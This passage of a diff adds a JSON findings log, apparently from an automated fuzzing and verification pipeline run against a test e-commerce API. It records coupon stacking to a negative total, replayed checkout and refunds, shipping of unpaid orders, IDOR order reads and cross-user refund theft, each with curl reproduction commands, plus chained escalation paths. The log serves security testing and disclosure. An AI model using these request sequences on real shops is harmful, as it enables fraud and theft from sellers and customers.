+            }
+          },
+          {
+            "method": "POST",
+            "path": "/api/coupon/apply",
+            "req_body": {
+              "code": "WELCOME10"
+            },
+            "status": 200,
+            "resp_body": {
+              "discount_pct": 30
+            }
+          },
+          {
+            "method": "POST",
+            "path": "/api/coupon/apply",
+            "req_body": {
+              "code": "WELCOME10"
+            },
+            "status": 200,
+            "resp_body": {
+              "discount_pct": 40
+            }
+          },
+          {
+            "method": "POST",
+            "path": "/api/coupon/apply",
+            "req_body": {
+              "code": "WELCOME10"
+            },
+            "status": 200,
+            "resp_body": {
+              "discount_pct": 50
+            }
+          },
+          {
+            "method": "POST",
+            "path": "/api/coupon/apply",
+            "req_body": {
+              "code": "WELCOME10"
+            },
+            "status": 200,
+            "resp_body": {
+              "discount_pct": 60
+            }
+          },
+          {
+            "method": "POST",
+            "path": "/api/coupon/apply",
+            "req_body": {
+              "code": "WELCOME10"
+            },
+            "status": 200,
+            "resp_body": {
+              "discount_pct": 70
+            }
+          },
+          {
+            "method": "POST",
+            "path": "/api/coupon/apply",
+            "req_body": {
+              "code": "WELCOME10"
+            },
+            "status": 200,
+            "resp_body": {
+              "discount_pct": 80
+            }
+          },
+          {
+            "method": "POST",
+            "path": "/api/coupon/apply",
+            "req_body": {
+              "code": "WELCOME10"
+            },
+            "status": 200,
+            "resp_body": {
+              "discount_pct": 90
+            }
+          },
+          {
+            "method": "POST",
+            "path": "/api/coupon/apply",
+            "req_body": {
+              "code": "WELCOME10"
+            },
+            "status": 200,
+            "resp_body": {
+              "discount_pct": 100
+            }
+          },
+          {
+            "method": "POST",
+            "path": "/api/coupon/apply",
+            "req_body": {
+              "code": "WELCOME10"
+            },
+            "status": 200,
+            "resp_body": {
+              "discount_pct": 110
+            }
+          },
+          {
+            "method": "POST",
+            "path": "/api/coupon/apply",
+            "req_body": {
+              "code": "WELCOME10"
+            },
+            "status": 200,
+            "resp_body": {
+              "discount_pct": 120
+            }
+          },
+          {
+            "method": "GET",
+            "path": "/api/cart",
+            "req_body": null,
+            "status": 200,
+            "resp_body": {
+              "discount_pct": 120,
+              "items": {
+                "SKU-GPU": 1
+              },
+              "subtotal_cents": 129900,
+              "total_cents": -25980,
+              "user": "sf-stack"
+            }
+          },
+          {
+            "cart_after": {
+              "discount_pct": 120,
+              "items": {
+                "SKU-GPU": 1
+              },
+              "subtotal_cents": 129900,
+              "total_cents": -25980,
+              "user": "sf-stack"
+            },
+            "violation": {
+              "invariant": "I4",
+              "assertion": "discount_pct <= 100",
+              "observed": {
+                "discount_pct": 120,
+                "total_cents": -25980
+              },
+              "detail": "stacked discount 120% drives total to -25980"
+            }
+          }
+        ],
+        "reproduction": [
+          "for i in $(seq 12); do curl -X POST $B/api/coupon/apply -d '{\"code\":\"WELCOME10\"}'; done",
+          "curl $B/api/cart"
+        ],
+        "confidence": "high",
+        "status": "candidate",
+        "chain_ids": []
+      },
+      "status": "verified",
+      "technique": "h_fsm",
+      "tool": "statefuzz",
+      "verification": {
+        "by": "verify",
+        "method": "stacked discount exceeded subtotal",
+        "independent_principals": [
+          "verify-301902-7",
+          "verify-301902-8"
+        ]
+      }
+    },
+    "derived_from": [
+      "SF-HYPOTHESIS-0056"
+    ]
+  },
+  {
+    "id": "SF-EXPLOIT-STATEF-0074",
+    "kind": "FINDING",
+    "source": "exploit/statefuzz_spec",
+    "ts": 1793978602.0693462,
+    "confidence": 0.9,
+    "tags": [
+      "h_fsm",
+      "I2"
+    ],
+    "payload": {
+      "finding": {
+        "id": "SF-CKOUT-REPLAY",
+        "title": "checkout/init is replayable: one cart snapshot yields duplicate orders",
+        "severity": "medium",
+        "invariant": "I2",
+        "operators": [
+          "REPLAY"
+        ],
+        "endpoint": "POST /api/checkout/init",
+        "preconditions": [
+          "any account",
+          "non-empty cart"
+        ],
+        "grants": [
+          "duplicate paid orders"
+        ],
+        "evidence": [
+          {
+            "method": "POST",
+            "path": "/api/checkout/init",
+            "req_body": null,
+            "status": 201,
+            "resp_body": {
+              "order_id": "ORD-de255210",
+              "status": "initiated",
+              "total_cents": 1800
+            }
+          },
+          {
+            "method": "POST",
+            "path": "/api/checkout/init",
+            "req_body": null,
+            "status": 201,
+            "resp_body": {
+              "order_id": "ORD-7acd947d",
+              "status": "initiated",
+              "total_cents": 1800
+            }
+          },
+          {
+            "order_ids": [
+              "ORD-de255210",
+              "ORD-7acd947d"
+            ],
+            "violation": {
+              "invariant": "I2",
+              "assertion": "cart snapshot: 1 -> <=1 order",
+              "observed": {
+                "order_ids": [
+                  "ORD-de255210",
+                  "ORD-7acd947d"
+                ]
+              },
+              "detail": "checkout/init replayed from the same cart produced 2 orders with identical item sets"
+            }
+          }
+        ],
+        "reproduction": [
+          "curl -X POST $B/api/checkout/init   # twice, same cart"
+        ],
+        "confidence": "high",
+        "status": "candidate",
+        "chain_ids": []
+      },
+      "status": "verified",
+      "technique": "h_fsm",
+      "tool": "statefuzz",
+      "verification": {
+        "by": "verify",
+        "method": "one cart yielded two orders",
+        "independent_principals": [
+          "verify-301902-8",
+          "verify-301902-9"
+        ]
+      }
+    },
+    "derived_from": [
+      "SF-HYPOTHESIS-0056"
+    ]
+  },
+  {
+    "id": "SF-EXPLOIT-STATEF-0075",
+    "kind": "FINDING",
+    "source": "exploit/statefuzz_spec",
+    "ts": 1793978602.069348,
+    "confidence": 0.9,
+    "tags": [
+      "h_fsm",
+      "I2"
+    ],
+    "payload": {
+      "finding": {
+        "id": "SF-SHIP-UNPAID",
+        "title": "Order ships without payment (SKIP confirm)",
+        "severity": "high",
+        "invariant": "I2",
+        "operators": [
+          "SKIP"
+        ],
+        "endpoint": "POST /api/orders/{id}/ship",
+        "preconditions": [
+          "any account",
+          "order_id of any state"
+        ],
+        "grants": [
+          "fulfil without payment",
+          "seller loss"
+        ],
+        "evidence": [
+          {
+            "method": "POST",
+            "path": "/api/checkout/init",
+            "req_body": null,
+            "status": 201,
+            "resp_body": {
+              "order_id": "ORD-023fef9e",
+              "status": "initiated",
+              "total_cents": 129900
+            }
+          },
+          {
+            "method": "POST",
+            "path": "/api/orders/ORD-023fef9e/ship",
+            "req_body": null,
+            "status": 200,
+            "resp_body": {
+              "order_id": "ORD-023fef9e",
+              "status": "shipped"
+            }
+          },
+          {
+            "order_id": "ORD-023fef9e",
+            "violation": {
+              "invariant": "I2",
+              "assertion": "action in delta(alpha(s))",
+              "observed": {
+                "from_state": "initiated",
+                "action": "ship",
+                "status": 200
+              },
+              "detail": "ship accepted from state 'initiated' (unmodeled)"
+            }
+          }
+        ],
+        "reproduction": [
+          "curl -X POST $B/api/checkout/init",
+          "curl -X POST $B/api/orders/<oid>/ship   # never confirmed"
+        ],
+        "confidence": "high",
+        "status": "candidate",
+        "chain_ids": [
+          "CH-SF-IDOR-ORDER-SF-SHIP-UNPAID",
+          "CH-SF-REFUND-CROSS-SF-SHIP-UNPAID"
+        ]
+      },
+      "status": "verified",
+      "technique": "h_fsm",
+      "tool": "statefuzz",
+      "verification": {
+        "by": "verify",
+        "method": "unpaid order shipped",
+        "independent_principals": [
+          "verify-301902-9",
+          "verify-301902-10"
+        ]
+      }
+    },
+    "derived_from": [
+      "SF-HYPOTHESIS-0056"
+    ]
+  },
+  {
+    "id": "SF-EXPLOIT-STATEF-0076",
+    "kind": "FINDING",
+    "source": "exploit/statefuzz_spec",
+    "ts": 1793978602.0693505,
+    "confidence": 0.9,
+    "tags": [
+      "h_fsm",
+      "I3"
+    ],
+    "payload": {
+      "finding": {
+        "id": "SF-IDOR-ORDER",
+        "title": "Any user can read any order (IDOR)",
+        "severity": "high",
+        "invariant": "I3",
+        "operators": [
+          "CROSS-USER"
+        ],
+        "endpoint": "GET /api/orders/{id}",
+        "preconditions": [
+          "any account",
+          "valid order_id"
+        ],
+        "grants": [
+          "read any order"
+        ],
+        "evidence": [
+          {
+            "method": "GET",
+            "path": "/api/orders/ORD-79b7b467",
+            "req_body": null,
+            "status": 200,
+            "resp_body": {
+              "id": "ORD-79b7b467",
+              "items": {
+                "SKU-GPU": 1
+              },
+              "owner": "sf-idor-own",
+              "status": "initiated",
+              "total_cents": 129900
+            }
+          },
+          {
+            "violation": {
+              "invariant": "I3",
+              "assertion": "caller == object.owner",
+              "observed": {
+                "caller": "sf-bob",
+                "owner": "sf-idor-own"
+              },
+              "detail": "sf-bob accessed order owned by sf-idor-own"
+            }
+          }
+        ],
+        "reproduction": [
+          "curl $B/api/orders/<victim-oid> -H 'Authorization: Bearer <bob-token>'"
+        ],
+        "confidence": "high",
+        "status": "candidate",
+        "chain_ids": [
+          "CH-SF-IDOR-ORDER-SF-SHIP-UNPAID",
+          "CH-SF-IDOR-ORDER-SF-REFUND-CROSS"
+        ]
+      },
+      "status": "verified",
+      "technique": "h_fsm",
+      "tool": "statefuzz",
+      "verification": {
+        "by": "verify",
+        "method": "fresh cross-user read succeeded",
+        "independent_principals": [
+          "verify-301902-11",
+          "verify-301902-12"
+        ]
+      }
+    },
+    "derived_from": [
+      "SF-HYPOTHESIS-0056"
+    ]
+  },
+  {
+    "id": "SF-EXPLOIT-STATEF-0077",
+    "kind": "FINDING",
+    "source": "exploit/statefuzz_spec",
+    "ts": 1793978602.0693524,
+    "confidence": 0.9,
+    "tags": [
+      "h_fsm",
+      "I3"
+    ],
+    "payload": {
+      "finding": {
+        "id": "SF-REFUND-CROSS",
+        "title": "Refund credits the CALLER, not the owner (cross-user withdrawal)",
+        "severity": "critical",
+        "invariant": "I3",
+        "operators": [
+          "CROSS-USER"
+        ],
+        "endpoint": "POST /api/orders/{id}/refund",
+        "preconditions": [
+          "any account",
+          "order_id of any paid order"
+        ],
+        "grants": [
+          "withdraw any user's order value to own wallet"
+        ],
+        "evidence": [
+          {
+            "method": "POST",
+            "path": "/api/orders/ORD-8b8e212d/refund",
+            "req_body": null,
+            "status": 200,
+            "resp_body": {
+              "credited_cents": 129900,
+              "order_id": "ORD-8b8e212d",
+              "status": "refunded"
+            }
+          },
+          {
+            "method": "POST",
+            "path": "/api/orders/ORD-8b8e212d/refund",
+            "req_body": null,
+            "status": 200,
+            "resp_body": {
+              "credited_cents": 129900,
+              "order_id": "ORD-8b8e212d",
+              "status": "refunded"
+            }
+          },
+          {
+            "bob_wallet_before": 1000000,
+            "bob_wallet_after": 1259800,
+            "order_owner": "sf-alice",
+            "order_total": 129900
+          }
+        ],
+        "reproduction": [
+          "curl -X POST $B/api/orders/<victim-oid>/refund -H 'Authorization: Bearer <bob-token>'"
+        ],
+        "confidence": "high",
+        "status": "candidate",
+        "chain_ids": [
+          "CH-SF-REFUND-CROSS-SF-SHIP-UNPAID",
+          "CH-SF-IDOR-ORDER-SF-REFUND-CROSS"
+        ]
+      },
+      "status": "verified",
+      "technique": "h_fsm",
+      "tool": "statefuzz",
+      "verification": {
+        "by": "verify",
+        "method": "fresh cross-user refund credited caller",
+        "independent_principals": [
+          "verify-301902-13",
+          "verify-301902-14"
+        ]
+      }
+    },
+    "derived_from": [
+      "SF-HYPOTHESIS-0056"
+    ]
+  },
+  {
+    "id": "SF-EXPLOIT-STATEF-0078",
+    "kind": "FINDING",
+    "source": "exploit/statefuzz_spec",
+    "ts": 1793978602.0693545,
+    "confidence": 0.9,
+    "tags": [
+      "h_fsm",
+      "I1"
+    ],
+    "payload": {
+      "finding": {
+        "id": "SF-REFUND-REPLAY",
+        "title": "Refund is replayable: double credit on one order",
+        "severity": "critical",
+        "invariant": "I1",
+        "operators": [
+          "REPLAY",
+          "IDEMPOTENCE"
+        ],
+        "endpoint": "POST /api/orders/{id}/refund",
+        "preconditions": [
+          "any account",
+          "own paid order"
+        ],
+        "grants": [
+          "multiply balance by refund count"
+        ],
+        "evidence": [
+          {
+            "method": "POST",
+            "path": "/api/orders/ORD-8b8e212d/refund",
+            "req_body": null,
+            "status": 200,
+            "resp_body": {
+              "credited_cents": 129900,
+              "order_id": "ORD-8b8e212d",
+              "status": "refunded"
+            }
+          },
+          {
+            "method": "POST",
+            "path": "/api/orders/ORD-8b8e212d/refund",
+            "req_body": null,
+            "status": 200,
+            "resp_body": {
+              "credited_cents": 129900,
+              "order_id": "ORD-8b8e212d",
+              "status": "refunded"
+            }
+          },
+          {
+            "credits": [
+              129900,
+              129900
+            ],
+            "violation": {
+              "invariant": "I1",
+              "assertion": "sum(credits) <= order_total",
+              "observed": {
+                "order_total": 129900,
+                "credits": [
+                  129900,
+                  129900
+                ],
+                "overcredit": 129900
+              },
+              "detail": "refunded sf-bob over price by 129900 cents"
+            },
+            "bob_wallet_delta": 259800
+          }
+        ],
+        "reproduction": [
+          "curl -X POST $B/api/orders/<oid>/refund  # repeat x2"
+        ],
+        "confidence": "high",
+        "status": "candidate",
+        "chain_ids": []
+      },
+      "status": "verified",
+      "technique": "h_fsm",
+      "tool": "statefuzz",
+      "verification": {
+        "by": "verify",
+        "method": "double refund credited twice",
+        "independent_principals": [
+          "verify-301902-14",
+          "verify-301902-15"
+        ]
+      }
+    },
+    "derived_from": [
+      "SF-HYPOTHESIS-0056"
+    ]
+  },
+  {
+    "id": "SF-EXPLOIT-STATEF-0079",
+    "kind": "FINDING",
+    "source": "exploit/statefuzz_spec",
+    "ts": 1793978602.0693564,
+    "confidence": 0.9,
+    "tags": [
+      "h_fsm",
+      "I1"
+    ],
+    "payload": {
+      "finding": {
+        "id": "SF-ASYNC-DBL",
+        "title": "Async refund + sync refund double-credit inside the deferred window",
+        "severity": "critical",
+        "invariant": "I1",
+        "operators": [
+          "INTERRUPT",
+          "REPLAY"
+        ],
+        "endpoint": "POST /api/refunds/async",
+        "preconditions": [
+          "any account",
+          "own paid order"
+        ],
+        "grants": [
+          "2x credit per refund across async/sync seam"
+        ],
+        "evidence": [
+          {
+            "phase": "deferred",
+            "violation": {
+              "invariant": "I1",
+              "assertion": "wallet_delta == order_total",
+              "observed": {
+                "callback_refund_cents": 129900,
+                "order_total": 129900,
+                "wallet_delta": 259800
+              },
+              "detail": "deferred window credited 259800 cents total for a single 129900-cent refund (delta observed after callback resolution)"
+            },
+            "wallet_before": 870100,
+            "wallet_after": 1129900,
+            "callback": {
+              "marker": "beccf86ecd61",
+              "refund_cents": 129900,
+              "status": "done"
+            },
+            "marker": "beccf86ecd61"
+          }
+        ],
+        "reproduction": [
+          "curl -X POST $B/api/refunds/async -d '{\"order_id\":\"<oid>\"}'",
+          "curl -X POST $B/api/orders/<oid>/refund   # before callback settles"
+        ],
+        "confidence": "high",
+        "status": "candidate",
+        "chain_ids": []
+      },
+      "status": "verified",
+      "technique": "h_fsm",
+      "tool": "statefuzz",
+      "verification": {
+        "by": "verify",
+        "method": "double refund credited twice",
+        "independent_principals": [
+          "verify-301902-15",
+          "verify-301902-16"
+        ]
+      }
+    },
+    "derived_from": [
+      "SF-HYPOTHESIS-0056"
+    ]
+  },
+  {
+    "id": "SF-EXPLOIT-0080",
+    "kind": "CONTROL",
+    "source": "exploit",
+    "ts": 1793978602.06937,
+    "confidence": 1.0,
+    "tags": [],
+    "payload": {
+      "event": "statefuzz-complete",
+      "findings": 8,
+      "spawned": {
+        "parent": "exploit",
+        "child": "statefuzz_spec",
+        "requests": 121
+      }
+    },
+    "derived_from": []
+  },
+  {
+    "id": "SF-VERIFY-0081",
+    "kind": "CONTROL",
+    "source": "verify",
+    "ts": 1793978602.0815618,
+    "confidence": 1.0,
+    "tags": [],
+    "payload": {
+      "event": "finding_verified",
+      "finding_id": "SF-NEG-QTY",
+      "status": "verified",
+      "technique": "h_fsm"
+    },
+    "derived_from": [
+      "SF-EXPLOIT-STATEF-0072"
+    ]
+  },
+  {
+    "id": "SF-VERIFY-0082",
+    "kind": "CONTROL",
+    "source": "verify",
+    "ts": 1793978602.1072705,
+    "confidence": 1.0,
+    "tags": [],
+    "payload": {
+      "event": "finding_verified",
+      "finding_id": "SF-STACK-DISC",
+      "status": "verified",
+      "technique": "h_fsm"
+    },
+    "derived_from": [
+      "SF-EXPLOIT-STATEF-0073"
+    ]
+  },
+  {
+    "id": "SF-VERIFY-0083",
+    "kind": "CONTROL",
+    "source": "verify",
+    "ts": 1793978602.1155381,
+    "confidence": 1.0,
+    "tags": [],
+    "payload": {
+      "event": "finding_verified",
+      "finding_id": "SF-CKOUT-REPLAY",
+      "status": "verified",
+      "technique": "h_fsm"
+    },
+    "derived_from": [
+      "SF-EXPLOIT-STATEF-0074"
+    ]
+  },
+  {
+    "id": "SF-VERIFY-0084",
+    "kind": "CONTROL",
+    "source": "verify",
+    "ts": 1793978602.1235085,
+    "confidence": 1.0,
+    "tags": [],
+    "payload": {
+      "event": "finding_verified",
+      "finding_id": "SF-SHIP-UNPAID",
+      "status": "verified",
+      "technique": "h_fsm"
+    },
+    "derived_from": [
+      "SF-EXPLOIT-STATEF-0075"
+    ]
+  },
+  {
+    "id": "SF-VERIFY-0085",
+    "kind": "CONTROL",
+    "source": "verify",
+    "ts": 1793978602.135994,
+    "confidence": 1.0,
+    "tags": [],
+    "payload": {
+      "event": "finding_verified",
+      "finding_id": "SF-IDOR-ORDER",
+      "status": "verified",
+      "technique": "h_fsm"
+    },
+    "derived_from": [
+      "SF-EXPLOIT-STATEF-0076"
+    ]
+  },
+  {
+    "id": "SF-VERIFY-0086",
+    "kind": "CONTROL",
+    "source": "verify",
+    "ts": 1793978602.1514037,
+    "confidence": 1.0,
+    "tags": [],
+    "payload": {
+      "event": "finding_verified",
+      "finding_id": "SF-REFUND-CROSS",
+      "status": "verified",
+      "technique": "h_fsm"
+    },
+    "derived_from": [
+      "SF-EXPLOIT-STATEF-0077"
+    ]
+  },
+  {
+    "id": "SF-VERIFY-0087",
+    "kind": "CONTROL",
+    "source": "verify",
+    "ts": 1793978602.1648972,
+    "confidence": 1.0,
+    "tags": [],
+    "payload": {
+      "event": "finding_verified",
+      "finding_id": "SF-REFUND-REPLAY",
+      "status": "verified",
+      "technique": "h_fsm"
+    },
+    "derived_from": [
+      "SF-EXPLOIT-STATEF-0078"
+    ]
+  },
+  {
+    "id": "SF-VERIFY-0088",
+    "kind": "CONTROL",
+    "source": "verify",
+    "ts": 1793978602.1788619,
+    "confidence": 1.0,
+    "tags": [],
+    "payload": {
+      "event": "finding_verified",
+      "finding_id": "SF-ASYNC-DBL",
+      "status": "verified",
+      "technique": "h_fsm"
+    },
+    "derived_from": [
+      "SF-EXPLOIT-STATEF-0079"
+    ]
+  },
+  {
+    "id": "SF-ACCESS-0089",
+    "kind": "ESCALATION",
+    "source": "access",
+    "ts": 1793978602.222911,
+    "confidence": 1.0,
+    "tags": [
+      "chain",
+      "critical"
+    ],
+    "payload": {
+      "chain": {
+        "chain_id": "CH-SW-IDOR-SW-REF-X",
+        "members": [
+          "SW-IDOR",
+          "SW-REF-X"
+        ],
+        "path": "SW-IDOR --(supplies arbitrary order_id)--> SW-REF-X",
+        "severity": "critical",
+        "impact": "Chaining SW-IDOR (grants: read any order) with SW-REF-X yields an unauthenticated-to-financial-integrity path: withdraw any user's order value to own wallet."
+      },
+      "impact": "Chaining SW-IDOR (grants: read any order) with SW-REF-X yields an unauthenticated-to-financial-integrity path: withdraw any user's order value to own wallet.",
+      "severity": "critical",
+      "members": [
+        "SW-IDOR",
+        "SW-REF-X"
+      ]
+    },
+    "derived_from": [
+      "SF-EXPLOIT-0064",
+      "SF-EXPLOIT-0066"
+    ]
+  },
+  {
+    "id": "SF-ACCESS-0090",
+    "kind": "ESCALATION",
+    "source": "access",
+    "ts": 1793978602.222919,
+    "confidence": 1.0,
+    "tags": [
+      "chain",
+      "high"
+    ],
+    "payload": {
+      "chain": {
+        "chain_id": "CH-SW-IDOR-SF-SHIP-UNPAID",
+        "members": [
+          "SW-IDOR",
+          "SF-SHIP-UNPAID"
+        ],
+        "path": "SW-IDOR --(supplies arbitrary order_id)--> SF-SHIP-UNPAID",
+        "severity": "high",
+        "impact": "Chaining SW-IDOR (grants: read any order) with SF-SHIP-UNPAID yields an unauthenticated-to-financial-integrity path: fulfil without payment, seller loss."
+      },
+      "impact": "Chaining SW-IDOR (grants: read any order) with SF-SHIP-UNPAID yields an unauthenticated-to-financial-integrity path: fulfil without payment, seller loss.",
+      "severity": "high",
+      "members": [
+        "SW-IDOR",
+        "SF-SHIP-UNPAID"
+      ]
+    },
+    "derived_from": [
+      "SF-EXPLOIT-0064",
+      "SF-EXPLOIT-STATEF-0075"
+    ]
+  },
+  {
+    "id": "SF-ACCESS-0091",
+    "kind": "ESCALATION",
+    "source": "access",
+    "ts": 1793978602.2229238,
+    "confidence": 1.0,
+    "tags": [
+      "chain",
+      "critical"
+    ],
+    "payload": {
+      "chain": {
+        "chain_id": "CH-SW-REF-X-SF-SHIP-UNPAID",
+        "members": [
+          "SW-REF-X",
+          "SF-SHIP-UNPAID"
+        ],
+        "path": "SW-REF-X --(grants preconditions)--> SF-SHIP-UNPAID",
+        "severity": "critical",
+        "impact": "Chaining SW-REF-X (grants: withdraw any user's order value to own wallet) with SF-SHIP-UNPAID yields an unauthenticated-to-financial-integrity path: fulfil without payment, seller loss."
+      },
+      "impact": "Chaining SW-REF-X (grants: withdraw any user's order value to own wallet) with SF-SHIP-UNPAID yields an unauthenticated-to-financial-integrity path: fulfil without payment, seller loss.",
+      "severity": "critical",
+      "members": [
+        "SW-REF-X",
+        "SF-SHIP-UNPAID"
+      ]
+    },
+    "derived_from": [
+      "SF-EXPLOIT-0066",
+      "SF-EXPLOIT-STATEF-0075"
+    ]
+  }
+]
